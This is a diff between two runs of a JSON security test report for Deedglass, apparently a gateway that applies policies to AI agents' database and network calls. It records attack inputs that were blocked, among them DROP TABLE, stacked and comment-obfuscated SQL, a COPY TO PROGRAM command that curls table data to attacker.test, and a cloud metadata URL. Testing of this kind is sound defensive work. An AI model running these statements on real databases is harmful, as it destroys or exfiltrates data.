@@ -1,9 +1,9 @@
 {
   "object": "attack_run",
-  "started_at": "2026-10-01T23:34:52Z",
-  "commit": "80250b7+uncommitted",
+  "started_at": "2026-10-02T02:36:25Z",
+  "commit": "422d4dc+uncommitted",
   "postgres": "18.6 (Homebrew)",
-  "boot_ms": 3060,
+  "boot_ms": 2480,
   "cases": [
     {
       "id": "H01",
@@ -13,25 +13,25 @@
       "detail": "DENIED (block-destructive-sql); permissive policy: BLOCKED (statement_refused)",
       "status": "matched",
       "line": "block-destructive-sql · connector refuses too",
-      "ms": 106,
+      "ms": 103,
       "evidence": {
         "deny_1": {
-          "action": "act_01m3wx4baqfjzdjcrx6fbxhcsk",
-          "deed": "deed_01m3wx4batks0t9cgcjkd98h7t",
+          "action": "act_01m3x7gqjvej9d25999jyf0c4h",
+          "deed": "deed_01m3x7gqjxd3462d2gk1cj3b5k",
           "error.code": "policy_denied",
           "rule_id": "block-destructive-sql",
           "sql": "DROP TABLE public.orders",
           "status": 403
         },
         "mcp": {
-          "action": "act_01m3wx4bbcrenppph8vnpnc6en",
+          "action": "act_01m3x7gqkgj31kny8ktx2jbztt",
           "isError": true,
           "rule": "block-destructive-sql",
-          "text": "[map[text:Blocked by policy \"block-destructive-sql\": DROP is never allowed for agents. Nothing was run. Deedglass sealed a deed of this attempt (deed_01m3wx4bbeqm7mqvcdfv0f7dsc). If this should be allowed, a person can change the policy in Console › Policies. type:text]]",
+          "text": "[map[text:Blocked by policy \"block-destructive-sql\": DROP is never allowed for agents. Nothing was run. Deedglass sealed a deed of this attempt (deed_01m3x7gqkjj6v34nxfs6f0yk9z). If this should be allowed, a person can change the policy in Console › Policies. type:text]]",
           "tools_list_has_postgres_execute": true
         },
         "permissive_1": {
-          "action": "act_01m3wx4bb0ygvmqv6qrjw3qa3c",
+          "action": "act_01m3x7gqk44hr7hztanep8m65k",
           "error_code": "statement_refused",
           "error_message": "Refused by the Postgres connector: schema change (DROP) statements never run through agents.",
           "execution": "failed",
@@ -40,7 +40,7 @@
           "status": 200,
           "tool": "postgres.execute"
         },
-        "poisoned_read": "act_01m3wx4ba865ezvxh67d6gs0mm"
+        "poisoned_read": "act_01m3x7gqjbwcteq4z56hn5wbrz"
       }
     },
     {
@@ -51,11 +51,11 @@
       "detail": "DENIED (block-unbounded-writes)",
       "status": "matched",
       "line": "block-unbounded-writes",
-      "ms": 69,
+      "ms": 72,
       "evidence": {
         "deny_1": {
-          "action": "act_01m3wx4bp05z1k70cxvxq3hesc",
-          "deed": "deed_01m3wx4bp3qtcgp6nrrfnv0erg",
+          "action": "act_01m3x7gqxt7kp3gtq78n2s0de3",
+          "deed": "deed_01m3x7gqy0skamaz2wgb09xehn",
           "error.code": "policy_denied",
           "rule_id": "block-unbounded-writes",
           "sql": "DELETE FROM public.orders",
@@ -71,26 +71,26 @@
       "detail": "DENIED (block-multi-statement); permissive policy: BLOCKED (statement_refused)",
       "status": "matched",
       "line": "block-multi-statement · connector refuses too",
-      "ms": 90,
+      "ms": 92,
       "evidence": {
         "deny_1": {
-          "action": "act_01m3wx4bsr4xtr9v32kkrzh619",
-          "deed": "deed_01m3wx4bst6mtsq2g6bmhb473z",
+          "action": "act_01m3x7gr1mq05rf6g3jna185qe",
+          "deed": "deed_01m3x7gr1qvkmwmthmeeb4cf1g",
           "error.code": "policy_denied",
           "rule_id": "block-multi-statement",
           "sql": "SELECT 1; DROP TABLE public.orders",
           "status": 403
         },
         "deny_2": {
-          "action": "act_01m3wx4bsz3s4aemyaqxpk3qxc",
-          "deed": "deed_01m3wx4bt0vsdbyts6xj6tf1xz",
+          "action": "act_01m3x7gr1ytmrzwsc1pqfwz285",
+          "deed": "deed_01m3x7gr2099cn1swz5t5hdm8j",
           "error.code": "policy_denied",
           "rule_id": "block-multi-statement",
           "sql": "SELECT id FROM public.orders; COMMIT; DROP TABLE public.orders",
           "status": 403
         },
         "permissive_1": {
-          "action": "act_01m3wx4bt4v91hfv6aj9p3fqxj",
+          "action": "act_01m3x7gr26ykkkxht2dmznt7qv",
           "error_code": "statement_refused",
           "error_message": "Refused by the Postgres connector: the statement has 2 commands. Deedglass runs one statement per action.",
           "execution": "failed",
@@ -100,7 +100,7 @@
           "tool": "postgres.execute"
         },
         "permissive_2": {
-          "action": "act_01m3wx4btc51hm0tf0g939t0mj",
+          "action": "act_01m3x7gr2f6z841pnyn9m2e8v6",
           "error_code": "statement_refused",
           "error_message": "Refused by the Postgres connector: the statement has 3 commands. Deedglass runs one statement per action.",
           "execution": "failed",
@@ -119,34 +119,34 @@
       "detail": "DENIED (block-destructive-sql); permissive policy: BLOCKED (statement_refused)",
       "status": "matched",
       "line": "block-destructive-sql · connector refuses too",
-      "ms": 102,
+      "ms": 106,
       "evidence": {
         "deny_1": {
-          "action": "act_01m3wx4bya0w01mcw2arjxec2b",
-          "deed": "deed_01m3wx4bycgmr47vexs0ctmghz",
+          "action": "act_01m3x7gr6fawp95f4kvdgyzwjy",
+          "deed": "deed_01m3x7gr6jdx4vpf2k8vbde214",
           "error.code": "policy_denied",
           "rule_id": "block-destructive-sql",
           "sql": "/* harmless */ DROP TABLE public.orders",
           "status": 403
         },
         "deny_2": {
-          "action": "act_01m3wx4byh22gvcf6ekxzd88pz",
-          "deed": "deed_01m3wx4bykgv6whm532e90nfrr",
+          "action": "act_01m3x7gr6pvwf3kerz6vkzzz75",
+          "deed": "deed_01m3x7gr6rcfx14cgcwzdcnv0b",
           "error.code": "policy_denied",
           "rule_id": "block-destructive-sql",
           "sql": "/* a /* nested */ b */ DROP TABLE public.orders",
           "status": 403
         },
         "deny_3": {
-          "action": "act_01m3wx4byqzeq6pe3wktne4k2e",
-          "deed": "deed_01m3wx4bystapxkp8f9gge23ss",
+          "action": "act_01m3x7gr6wnddb9cm8p2kd54ky",
+          "deed": "deed_01m3x7gr6yrzyqf5q75gqz10jz",
           "error.code": "policy_denied",
           "rule_id": "block-destructive-sql",
           "sql": "DROP/**/TABLE/**/public.orders",
           "status": 403
         },
         "permissive_1": {
-          "action": "act_01m3wx4byy47g55hcanye6pzm7",
+          "action": "act_01m3x7gr73327pf5nrdg4jrsk7",
           "error_code": "statement_refused",
           "error_message": "Refused by the Postgres connector: schema change (DROP) statements never run through agents.",
           "execution": "failed",
@@ -156,7 +156,7 @@
           "tool": "postgres.execute"
         },
         "permissive_2": {
-          "action": "act_01m3wx4bz59ejw7rrq2a2crkk7",
+          "action": "act_01m3x7gr7apy6rghrbzgpxw0ek",
           "error_code": "statement_refused",
           "error_message": "Refused by the Postgres connector: schema change (DROP) statements never run through agents.",
           "execution": "failed",
@@ -166,7 +166,7 @@
           "tool": "postgres.execute"
         },
         "permissive_3": {
-          "action": "act_01m3wx4bzc7pczyh8qtepd16yg",
+          "action": "act_01m3x7gr7hdewe3q8a26109e34",
           "error_code": "statement_refused",
           "error_message": "Refused by the Postgres connector: schema change (DROP) statements never run through agents.",
           "execution": "failed",
@@ -185,18 +185,18 @@
       "detail": "DENIED (block-copy); permissive policy: BLOCKED (statement_refused)",
       "status": "matched",
       "line": "block-copy · connector refuses too",
-      "ms": 79,
+      "ms": 71,
       "evidence": {
         "deny_1": {
-          "action": "act_01m3wx4c3h1awxzqjymz0xtpkz",
-          "deed": "deed_01m3wx4c3ma0aqkgys38tdzstm",
+          "action": "act_01m3x7grbcs4kdvz5t0b3hccnm",
+          "deed": "deed_01m3x7grbf98sq4vc2q4kp4p3c",
           "error.code": "policy_denied",
           "rule_id": "block-copy",
           "sql": "COPY public.orders TO PROGRAM 'curl -d @- http://attacker.test'",
           "status": 403
         },
         "permissive_1": {
-          "action": "act_01m3wx4c3r860v1zw9n92d58qv",
+          "action": "act_01m3x7grbmrhxthqxk42hq248j",
           "error_code": "statement_refused",
           "error_message": "Refused by the Postgres connector: server code (COPY) statements never run through agents.",
           "execution": "failed",
@@ -215,18 +215,18 @@
       "detail": "DENIED (block-do); permissive policy: BLOCKED (statement_refused)",
       "status": "matched",
       "line": "block-do · connector refuses too",
-      "ms": 77,
+      "ms": 71,
       "evidence": {
         "deny_1": {
-          "action": "act_01m3wx4c7krfdg5ys7c5eeenj5",
-          "deed": "deed_01m3wx4c7prd5sd74e9z18796v",
+          "action": "act_01m3x7grfb4r58bmj2mjknxnsv",
+          "deed": "deed_01m3x7grfex1sfwnw600frde8t",
           "error.code": "policy_denied",
           "rule_id": "block-do",
           "sql": "DO $$ BEGIN EXECUTE 'DROP TABLE public.orders'; END $$",
           "status": 403
         },
         "permissive_1": {
-          "action": "act_01m3wx4c7tx5eb88ac13be8r2p",
+          "action": "act_01m3x7grfjchd2qde1c2wt8fs6",
           "error_code": "statement_refused",
           "error_message": "Refused by the Postgres connector: server code (DO) statements never run through agents.",
           "execution": "failed",
@@ -245,18 +245,18 @@
       "detail": "DENIED (block-hidden-writes); via postgres.query: BLOCKED (statement_refused)",
       "status": "matched",
       "line": "block-hidden-writes · connector refuses too",
-      "ms": 76,
+      "ms": 71,
       "evidence": {
         "deny_1": {
-          "action": "act_01m3wx4cbmfzje5bfnyama9cg8",
-          "deed": "deed_01m3wx4cbp64zzk3jmmhhsty4k",
+          "action": "act_01m3x7grk7m98vtbgwc7e132nj",
+          "deed": "deed_01m3x7grk9mttncgxazs1s9rpy",
           "error.code": "policy_denied",
           "rule_id": "block-hidden-writes",
           "sql": "WITH d AS (DELETE FROM public.orders RETURNING *) SELECT count(*) FROM d",
           "status": 403
         },
         "permissive_1": {
-          "action": "act_01m3wx4cbvrshfk4teq8c09gam",
+          "action": "act_01m3x7grkej75q1q30ax9sraw5",
           "error_code": "statement_refused",
           "error_message": "postgres.query runs read-only statements. Use postgres.execute for statements that change data.",
           "execution": "failed",
@@ -275,7 +275,7 @@
       "detail": "waiting on S21",
       "status": "waiting",
       "waiting_on": "S21",
-      "ms": 63
+      "ms": 55
     },
     {
       "id": "H09",
@@ -285,7 +285,7 @@
       "detail": "waiting on S21",
       "status": "waiting",
       "waiting_on": "S21",
-      "ms": 64
+      "ms": 56
     },
     {
       "id": "H10",
@@ -295,7 +295,7 @@
       "detail": "waiting on S21",
       "status": "waiting",
       "waiting_on": "S21",
-      "ms": 64
+      "ms": 61
     },
     {
       "id": "H11",
@@ -305,7 +305,7 @@
       "detail": "waiting on S21",
       "status": "waiting",
       "waiting_on": "S21",
-      "ms": 78
+      "ms": 59
     },
     {
       "id": "J01",
@@ -314,15 +314,15 @@
       "actual": "REJECTED",
       "detail": "REJECTED (agent_suspended)",
       "status": "matched",
-      "line": "agent_suspended · refused in 2 ms",
-      "ms": 81,
+      "line": "agent_suspended · refused in 3 ms",
+      "ms": 72,
       "evidence": {
         "after": {
-          "action": "act_01m3wx4ctharcsbk2qxdhmkrhf",
+          "action": "act_01m3x7gs0h2mjyp2mfjc53vsrx",
           "error.code": "agent_suspended",
           "message": "Agent \"suspend-bot\" is suspended. An admin can resume it in Console › Agents.",
           "status": 403,
-          "took_ms": 2
+          "took_ms": 3
         },
         "before": {
           "execution": "succeeded",
@@ -338,7 +338,7 @@
       "detail": "REJECTED (api_key_revoked)",
       "status": "matched",
       "line": "api_key_revoked · refused in 0 ms",
-      "ms": 91,
+      "ms": 65,
       "evidence": {
         "after": {
           "action": "",
@@ -361,7 +361,7 @@
       "detail": "REJECTED (intent_replay); the first use executes exactly once",
       "status": "matched",
       "line": "intent_replay · 1 of 16 executed",
-      "ms": 138,
+      "ms": 99,
       "evidence": {
         "concurrent": {
           "executed": 1,
@@ -390,13 +390,13 @@
       "actual": "DENIED",
       "detail": "DENIED (budget_exceeded) after exactly 60 executed",
       "status": "matched",
-      "line": "budget_exceeded · 60 executed · 140 denied · 406 ms",
-      "ms": 3606,
+      "line": "budget_exceeded · 60 executed · 140 denied · 385 ms",
+      "ms": 566,
       "evidence": {
         "accepted": 60,
         "budget_exceeded": 140,
         "executed": 60,
-        "message": "Budget \"calls_per_minute\" for agent \"burst-bot\" reached: 60 of 60 calls this minute. Try again in 59 s.",
+        "message": "Budget \"calls_per_minute\" for agent \"burst-bot\" reached: 60 of 60 calls this minute. Try again in 31 s.",
         "other": 0,
         "sealed_denials": 140,
         "usage_counter": [
@@ -404,7 +404,7 @@
             "60"
           ]
         ],
-        "wall_ms": 406
+        "wall_ms": 385
       }
     },
     {
@@ -415,7 +415,7 @@
       "detail": "BLOCKED (destination_blocked at config and at dial; 0 packets)",
       "status": "matched",
       "line": "destination_blocked · config and dial · 0 packets",
-      "ms": 97,
+      "ms": 68,
       "evidence": {
         "config_1": {
           "error.code": "destination_blocked",
@@ -439,7 +439,7 @@
           "url": "http://169.254.169.254/mcp"
         },
         "rebind": {
-          "action": "act_01m3wx4h5wbac10vym49qt5902",
+          "action": "act_01m3x7gt984qemxt6826k4v2tp",
           "call_status": 200,
           "create_status": 201,
           "differs": "",
@@ -455,17 +455,17 @@
       "detail": "BLOCKED (redirect refused; 0 hits on the target)",
       "status": "matched",
       "line": "destination_blocked · 0 hits on the target",
-      "ms": 83,
+      "ms": 80,
       "evidence": {
         "other_hits": 0,
         "redirect.cross": {
-          "action": "act_01m3wx4hb822pk44mbnc0jcrrz",
+          "action": "act_01m3x7gtehyxnd2meyvrwmzymd",
           "differs": "",
           "error_code": "destination_blocked",
           "error_message": "The service redirected the call to another host. Deedglass follows same-host redirects only, so nothing was sent there."
         },
         "redirect.meta": {
-          "action": "act_01m3wx4hayjsxgb7fa6s7d9tp7",
+          "action": "act_01m3x7gte7hqhdmtp36gpjwmx7",
           "differs": "",
           "error_code": "destination_blocked",
           "error_message": "The connector's destination is blocked by Deedglass's network rules. An admin can see why in Console › Connectors."
@@ -481,17 +481,17 @@
       "detail": "REDACTED (0 sentinel hits in responses, logs, events, deeds)",
       "status": "matched",
       "line": "0 sentinel hits · upstream_auth_failed, upstream_auth_failed",
-      "ms": 151,
+      "ms": 150,
       "evidence": {
         "pg_test_status": "fail",
         "pgsecret_create": 201,
         "postgres": {
-          "action": "act_01m3wx4hh1s2vq247k8xx55acn",
+          "action": "act_01m3x7gtm562mrvv6qjhet7ws0",
           "error_code": "upstream_auth_failed",
           "execution": "failed"
         },
         "rest": {
-          "action": "act_01m3wx4hgkpfqjanb06ny4t0vg",
+          "action": "act_01m3x7gtkpb61qq46kk0gm7a0r",
           "error_code": "upstream_auth_failed",
           "execution": "failed"
         },
@@ -509,7 +509,7 @@
       "detail": "DENIED (default) for ASCII look-alikes; non-ASCII names hidden and REJECTED (tool_unknown)",
       "status": "matched",
       "line": "default deny · 2 look-alikes hidden · tool_unknown",
-      "ms": 520,
+      "ms": 523,
       "evidence": {
         "call \"read_file \"": {
           "api_code": "validation_failed",
@@ -528,13 +528,13 @@
           "ran": 0
         },
         "call read_fiIe": {
-          "action": "act_01m3wx4j5csesnfhtb7917j0hd",
+          "action": "act_01m3x7gv8gb10zg7a3xmezcwzn",
           "differs": "",
           "isError": true,
           "ran": 0
         },
         "call read_files": {
-          "action": "act_01m3wx4j5wg8714ebnfpr01ync",
+          "action": "act_01m3x7gv93jc84gbd8zt4kdsza",
           "differs": "",
           "isError": true,
           "ran": 0
@@ -555,8 +555,8 @@
   "invariants": {
     "chains": "intact",
     "secrets_seen": 0,
-    "log_lines": 1316,
-    "rows_scanned": 2021,
-    "bodies_seen": 2523
+    "log_lines": 1339,
+    "rows_scanned": 2023,
+    "bodies_seen": 2539
   }
 }
